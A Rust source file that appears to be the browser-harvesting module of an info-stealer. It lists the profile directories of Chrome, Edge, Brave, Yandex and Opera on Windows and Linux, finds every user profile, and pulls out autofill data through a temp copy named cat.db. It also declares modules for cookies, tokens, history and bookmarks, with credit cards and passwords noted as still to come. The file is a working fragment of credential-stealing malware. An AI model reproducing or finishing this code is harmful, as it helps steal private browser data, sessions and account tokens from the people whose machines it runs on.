mod autofill;
mod bookmarks;
mod cookies;
mod history;
mod token;
// credit cards
// passwords

use std::path::PathBuf;

pub async fn get_browser() {
    let mut browser_root = get_browser_root_paths();

    let mut tempfile = if cfg!(target_os = "windows") {
        PathBuf::from(std::env::var("TEMP").unwrap())
    } else {
        PathBuf::from(String::from("/tmp"))
    };
    tempfile.push("cat.db");

    for path_entry in browser_root.iter_mut() {
        if let Ok(profiles) = get_profiles(path_entry).await {
            // cookies::get_cookies(path_entry, &profiles).await;
            // token::get_token(path_entry, &profiles).await;
            let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
            println!("{autofills:#?}");
            // bookmarks::get_bookmarks(path_entry, &profiles).await;
            // history::get_history(path_entry, &profiles).await;
        }
    }
}

fn get_browser_root_paths() -> Vec<PathBuf> {
    let mut browser_root;

    if cfg!(target_os = "windows") {
        browser_root = Vec::with_capacity(8);
        let local = std::env::var("LOCALAPPDATA").unwrap();
        let roaming = std::env::var("APPDATA").unwrap();

        browser_root.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
        browser_root.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
        browser_root.push(PathBuf::from(format!(
            "{local}/BraveSoftware/Brave-Browser/User Data"
        ))); // Brave Browser
             // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
             // browser_root.push(PathBuf::from(format!(""))), // Firefox
        browser_root.push(PathBuf::from(format!(
            "{local}/Yandex/YandexBrowser/User Data"
        ))); // Yandex
        browser_root.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera GX Stable"
        ))); // Opera GX Browser
        browser_root.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera Stable"
        ))); // Opera Browser
    } else {
        // for linux
        browser_root = Vec::with_capacity(7);
        let home = std::env::var("HOME").unwrap();

        // browser_root.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
        browser_root.push(PathBuf::from(format!(
            "{home}/.config/BraveSoftware/Brave-Browser"
        )));
        // browser_root[2].push(""); // Chromium
        // browser_root[2].push(""); // Google Chrome
        // browser_root[3].push(""); // Microsoft Edge
        // browser_root[5].push(""); // Yandex
        // browser_root[6].push(""); // Opera
    }

    browser_root
}

async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
    // checking if browser is installed or not
    match tokio::fs::read_dir(&path).await {
        Ok(mut list) => {
            let mut profiles = Vec::with_capacity(16);
            profiles.push("Default".to_string());
            // loop through all other profiles
            while let Ok(dir_entry_unknown) = list.next_entry().await {
                if let Some(dir_entry) = dir_entry_unknown {
                    if let Some(entry) = dir_entry.file_name().to_str() {
                        if !entry.contains("Profile") {
                            continue;
                        }
                    }
                    profiles.push(dir_entry.file_name().into_string().unwrap());
                } else {
                    break;
                }
            }
            return Ok(profiles);
        }
        Err(e) => return Err(e),
    }
}
